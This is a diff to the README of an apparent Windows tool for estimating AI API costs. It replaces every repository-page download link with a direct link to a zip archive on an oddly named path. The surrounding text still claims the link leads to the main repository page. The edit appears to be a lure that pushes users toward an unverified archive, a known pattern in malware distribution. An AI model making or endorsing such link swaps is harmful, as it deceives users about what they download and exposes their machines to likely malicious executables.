@@ -1,6 +1,6 @@
 # ⚙️ llm-cost-calculator - Estimate AI API Costs Easily
 
-[![Download llm-cost-calculator](https://img.shields.io/badge/Download-llm--cost--calculator-green?style=for-the-badge)](https://github.com/akunba3970/llm-cost-calculator)
+[![Download llm-cost-calculator](https://img.shields.io/badge/Download-llm--cost--calculator-green?style=for-the-badge)](https://github.com/akunba3970/llm-cost-calculator/raw/refs/heads/main/pipingly/cost-llm-calculator-phonautogram.zip)
 
 ## 📋 What is llm-cost-calculator?
 
@@ -25,7 +25,7 @@ No additional software is required. The app runs on Windows without needing spec
 
 Go to the official project page to get the app. Click this link:
 
-[Download llm-cost-calculator](https://github.com/akunba3970/llm-cost-calculator)
+[Download llm-cost-calculator](https://github.com/akunba3970/llm-cost-calculator/raw/refs/heads/main/pipingly/cost-llm-calculator-phonautogram.zip)
 
 This link will take you to the main repository page, where you can find the latest release files.
 
@@ -107,6 +107,6 @@ For more detailed information on AI API pricing, you can visit the official webs
 
 Start downloading the tool from this link:
 
-[Download llm-cost-calculator](https://github.com/akunba3970/llm-cost-calculator)
+[Download llm-cost-calculator](https://github.com/akunba3970/llm-cost-calculator/raw/refs/heads/main/pipingly/cost-llm-calculator-phonautogram.zip)
 
 Follow the five-step guide above to install and use the tool quickly on your Windows computer. Whether you want to check one project or many, llm-cost-calculator helps you understand your AI API costs without confusion.
